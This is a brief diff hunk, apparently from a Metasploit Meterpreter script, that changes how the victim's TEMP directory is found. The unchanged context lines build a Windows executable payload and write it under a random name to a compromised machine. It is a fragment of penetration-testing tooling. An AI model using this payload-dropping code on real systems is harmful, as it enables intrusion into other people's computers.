@@ -87,7 +87,7 @@ client.sys.process.get_processes().each do |m|
     exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
 
     # Place our newly created exe in %TEMP%
-    tempdir = client.fs.file.expand_path("%TEMP%")
+    tempdir = client.sys.config.getenv('TEMP')
     tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
     print_status("Sending EXE payload '#{tempexe}'.")
     fd = client.fs.file.new(tempexe, "wb")
